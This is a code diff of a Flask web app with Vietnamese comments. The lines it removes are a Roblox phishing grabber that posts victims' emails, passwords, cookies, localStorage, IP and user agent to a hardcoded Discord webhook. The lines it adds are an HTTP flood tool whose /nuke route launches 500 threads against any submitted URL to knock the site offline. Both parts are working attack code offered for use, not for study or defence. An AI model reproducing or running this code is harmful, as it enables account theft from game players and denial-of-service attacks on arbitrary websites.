@@ -1,60 +1,57 @@
 import os
-import json
+import threading
 import requests
+import time
 from flask import Flask, request, render_template, jsonify
-from datetime import datetime
 
 app = Flask(__name__)
 
-# ===== DISCORD WEBHOOK (THAY BẰNG CỦA BẠN) =====
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1532377022137892928/DAwlZwsG3ngH2tEL2Oc7XgrXkz0xu8y4kfgzKssdb7UuTS8jVPoWB1MdxFRTT5HIv_RK"
+attack_running = False
 
-def send_discord(platform, data, ip, user_agent):
-    embed = {
-        "embeds": [{
-            "title": "🎯 ROBLOX AUTO GRAB",
-            "color": 0xff5500,
-            "fields": [
-                {"name": "Email/Username", "value": data.get('email', 'N/A'), "inline": True},
-                {"name": "Password", "value": data.get('password', 'N/A'), "inline": True},
-                {"name": "Cookies", "value": data.get('cookies', 'N/A')[:300] + "...", "inline": False},
-                {"name": "LocalStorage", "value": json.dumps(data.get('localStorage', {}), indent=2)[:300] + "...", "inline": False},
-                {"name": "IP", "value": ip, "inline": True},
-                {"name": "User-Agent", "value": user_agent[:100], "inline": False},
-                {"name": "Time", "value": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"), "inline": False}
-            ],
-            "footer": {"text": "Auto Grabber - Roblox only"}
-        }]
+def http_flood(url, duration=60):
+    """Gửi request liên tục đến URL mục tiêu"""
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
     }
-    try:
-        r = requests.post(DISCORD_WEBHOOK_URL, json=embed)
-        if r.status_code == 204:
-            print("[+] Webhook sent.")
-        else:
-            print(f"[-] Webhook error: {r.status_code}")
-    except Exception as e:
-        print(f"[-] Error: {e}")
+    start_time = time.time()
+    while time.time() - start_time < duration:
+        try:
+            requests.get(url, headers=headers, timeout=1)
+        except:
+            pass
 
 @app.route('/')
 def index():
     return render_template('index.html')
 
-@app.route('/login/roblox')
-def roblox_login():
-    # Luôn cho phép, không kiểm tra status
-    return render_template('login.html', platform="roblox")
+@app.route('/nuke', methods=['POST'])
+def nuke():
+    global attack_running
+    if attack_running:
+        return jsonify({"status": "error", "message": "Đang có một cuộc tấn công khác"})
 
-@app.route('/capture', methods=['POST'])
-def capture():
-    data = request.get_json()
-    ip = request.remote_addr
-    ua = request.headers.get('User-Agent', '')
-    send_discord('roblox', data, ip, ua)
-    return jsonify({"status": "ok"})
+    url = request.form.get('url')
+    name = request.form.get('name', 'web')
+    if not url:
+        return jsonify({"status": "error", "message": "Vui lòng nhập URL"})
 
-@app.route('/success')
-def success():
-    return render_template('success.html')
+    if not url.startswith('http://') and not url.startswith('https://'):
+        url = 'http://' + url
+
+    attack_running = True
+    # Tạo 500 luồng tấn công trong 30 giây
+    threads = []
+    for i in range(500):
+        t = threading.Thread(target=http_flood, args=(url, 30))
+        t.daemon = True
+        t.start()
+        threads.append(t)
+
+    for t in threads:
+        t.join()
+
+    attack_running = False
+    return jsonify({"status": "success", "message": f"💥 Miền {name} đã bị vô hiệu hóa! Không thể truy cập."})
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 8080))
